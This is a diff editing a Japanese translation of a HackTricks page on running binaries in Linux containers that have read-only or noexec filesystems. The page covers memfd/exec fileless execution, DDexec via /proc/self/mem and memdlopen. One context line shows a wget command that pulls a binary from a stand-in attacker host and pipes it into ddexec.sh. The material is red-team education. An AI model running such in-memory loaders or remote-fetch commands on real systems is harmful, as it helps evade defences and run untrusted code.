@@ -2,34 +2,34 @@
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使用して、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
 
 HackTricksをサポートする他の方法：
 
 - **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする
-- **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する**
+- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
+- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローしてください。
+- **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-**ハッキングキャリア**に興味があり、**解読不能なものをハック**したい場合は、**採用中**です（_流暢なポーランド語の読み書きが必要です_）。
+**ハッキングキャリア**に興味がある方や**解読不能なものをハック**したい方 - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 ## 動画
 
-以下の動画では、このページで言及されているテクニックについて詳しく説明されています：
+以下の動画では、このページで言及されているテクニックについて、より詳しく説明されています：
 
 - [**DEF CON 31 - ステルスと回避のためのLinuxメモリ操作の探索**](https://www.youtube.com/watch?v=poHirez8jk4)
 - [**DDexec-ngとインメモリdlopen()によるステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
 ## 読み取り専用 / 実行不可シナリオ
 
-Linuxマシンが**読み取り専用（ro）ファイルシステム保護**でマウントされることがますます一般的になっていますが、特にコンテナではそうです。これは、`securitycontext`で**`readOnlyRootFilesystem: true`**を設定するだけで、roファイルシステムでコンテナを実行するのが簡単であるためです：
+**読み取り専用（ro）ファイルシステム保護**が**Linuxマシン**で**より一般的**になってきており、特にコンテナで見つけることができます。これは、roファイルシステムでコンテナを実行するのは、`securitycontext`で**`readOnlyRootFilesystem: true`**を設定するだけで簡単だからです：
 
 ```yaml
 apiVersion: v1
@@ -45,37 +45,39 @@ securityContext:
     command: ["sh", "-c", "while true; do sleep 1000; done"]
 ```
 
-しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`**は書き込み可能のままであるため、ディスクに書き込むことができないということはありません。ただし、このフォルダは**実行不可保護**でマウントされるため、ここにバイナリをダウンロードしても**実行できません**。
+しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`**は書き込み可能のままであるため、ディスクに何も書き込めないというわけではありません。ただし、このフォルダは**実行不可保護**でマウントされているため、ここにバイナリをダウンロードしても**実行できません**。
 
 {% hint style="warning" %}
-レッドチームの観点からすると、これはバイナリ（バックドアや`kubectl`のような列挙ツールなど）を**ダウンロードして実行するのが複雑**になります。
+レッドチームの観点からすると、これは**バイナリをダウンロードして実行するのが複雑**になります（バックドアや`kubectl`のような既存のシステムにないバイナリ）。
 {% endhint %}
 
 ## 最も簡単なバイパス：スクリプト
 
 バイナリを言及しましたが、インタプリタがマシン内にある限り、**シェルスクリプト**（`sh`が存在する場合）や**Pythonスクリプト**（`python`がインストールされている場合）など、**任意のスクリプトを実行**できます。
 
-ただし、これだけではバイナリバックドアや他の実行する必要があるバイナリツールを実行するのには十分ではありません。
+ただし、これだけではバイナリバックドアや実行する必要がある他のバイナリツールを実行するのには十分ではありません。
 
 ## メモリバイパス
 
-ファイルシステムがそれを許可していない場合にバイナリを実行したい場合、**メモリから実行**するのが最善です。なぜなら、**その保護はそこには適用されない**からです。
+ファイルシステムがそれを許可していない場合にバイナリを実行したい場合、**メモリから実行**するのが最適です。なぜなら、**その保護はそこには適用されない**からです。
 
 ### FD + execシステムコールバイパス
 
-**Python**、**Perl**、**Ruby**などの強力なスクリプトエンジンがマシン内にある場合、メモリから実行するためにバイナリをダウンロードし、メモリファイルディスクリプタに保存し（`create_memfd`システムコール）、これらの保護によって保護されないため、**fdをファイルとして実行する**ために**`exec`システムコール**を呼び出すことができます。
+**Python**、**Perl**、**Ruby**などの強力なスクリプトエンジンがマシン内にある場合、メモリにバイナリをダウンロードして実行し、それを保護されないメモリファイルディスクリプタ（`create_memfd`システムコール）に保存し、その後**`exec`システムコール**を呼び出して**fdを実行するファイル**として指定します。
 
-これには、プロジェクト[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)を簡単に使用できます。バイナリを渡すと、バイナリが**デコードおよび解凍された**スクリプトが生成され、`create_memfd`システムコールを呼び出して作成された**fd**にバイナリを格納し、**実行するためのexec**システムコールが呼び出されます。
+これには、プロジェクト[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)を簡単に使用できます。バイナリを渡すと、バイナリが**デコードおよび解凍された**スクリプトが生成され、`create_memfd`システムコールを呼び出して作成された**fd**にバイナリを格納し、それを実行する**exec**システムコールが呼び出されます。
 
 {% hint style="warning" %}
-これは、PHPやNodeなどの他のスクリプト言語では、スクリプトから**生のシステムコールを呼び出すデフォルトの方法**がないため、`create_memfd`を呼び出して**バイナリを格納するメモリfd**を作成することができないため、これは機能しません。
+これは、PHPやNodeなどの他のスクリプト言語では**スクリプトから生のシステムコールを呼び出すデフォルトの方法**がないため、`create_memfd`を呼び出して**バイナリを格納するメモリfd**を作成することができません。
 
 また、`/dev/shm`内のファイルで**通常のfd**を作成しても機能しないため、**実行不可保護**が適用されるため実行できません。
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)は、**`/proc/self/mem`**を上書きすることで、**自分自身のプロセスのメモリを変更**する技術であり、**プロセスが実行しているアセンブリコード**を制御することで、**シェルコード**を書き込んでプロセスを**任意のコードを実行**するように「変異」させることができます。
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)は、**`/proc/self/mem`**を上書きすることで、**自分自身のプロセスのメモリを変更**する技術です。
+
+したがって、プロセスが実行している**アセンブリコードを制御**することで、**シェルコード**を書き込み、プロセスを**任意のコードを実行**するように「変異」させることができます。
 
 {% hint style="success" %}
 **DDexec / EverythingExec**を使用すると、**自分自身のメモリから**自分自身の**シェルコード**または**任意のバイナリ**を**ロードして実行**できます。
@@ -92,7 +94,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 ### Memdlopen
 
-DDexecと同様の目的を持つ[**memdlopen**](https://github.com/arget13/memdlopen)技術は、**メモリにバイナリをロードして後で実行するための簡単な方法**を提供します。これにより、依存関係を持つバイナリをロードすることさえ可能になります。
+DDexecと同様の目的を持つ[**memdlopen**](https://github.com/arget13/memdlopen)技術は、後で実行するためにメモリにバイナリをロードする**簡単な方法**を提供します。これにより、依存関係を持つバイナリをロードすることさえ可能になります。
 
 ## Distroless Bypass
 
